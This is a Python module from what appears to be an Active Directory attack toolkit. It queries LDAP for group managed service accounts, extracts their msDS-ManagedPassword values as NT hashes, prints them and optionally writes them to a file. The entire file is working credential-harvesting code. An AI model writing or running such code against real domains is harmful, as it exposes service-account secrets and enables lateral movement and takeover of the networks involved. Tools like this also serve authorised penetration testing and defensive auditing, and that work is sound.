from rich.console import Console
console = Console()
from uuid import uuid4

from parsers.formatters import fmt_gmsa
from protocols.ldap import safe_ldap_attr

class Gmsa:
    name = "gmsa"
    desc = "Get GMSA accounts passwords"
    search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
    attributes = ["sAMAccountName", "msDS-ManagedPassword"]

    def on_login(self, conn, base_dn, save_output = False, module_args = None):
        console.print(f"[[green]+[/]] [cyan]MODULE[/]  Running [yellow]{self.name}[/] module")

        results = conn.search(base_dn, self.search_filter, attributes=self.attributes)
        entries = conn.entries

        if not entries:
            console.print(f"\n[[red]![/]] No results for {self.name}") 
            return
        
        console.print(f"[[green]+[/]] [cyan]QUERY[/]   [white]{self.search_filter}[/]\n", highlight=False)

        values = []
        for entry in conn.entries:
            sAMAccountName = safe_ldap_attr(entry, 'sAMAccountName', 'None')
            msDS_ManagedPassword = safe_ldap_attr(entry, fmt_gmsa('msDS-ManagedPassword'), 'None')

            result = f"Account: {sAMAccountName} - NT Hash: {msDS_ManagedPassword}"
            values.append(result)

            console.print(result, highlight=False)

        if save_output:
            filename = f"{self.name}_{uuid4().hex}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                for v in values:
                    f.write(v + "\n")
            console.print(f"\n[[green]+[/]] Output saved to {filename}", highlight=False)

        return values
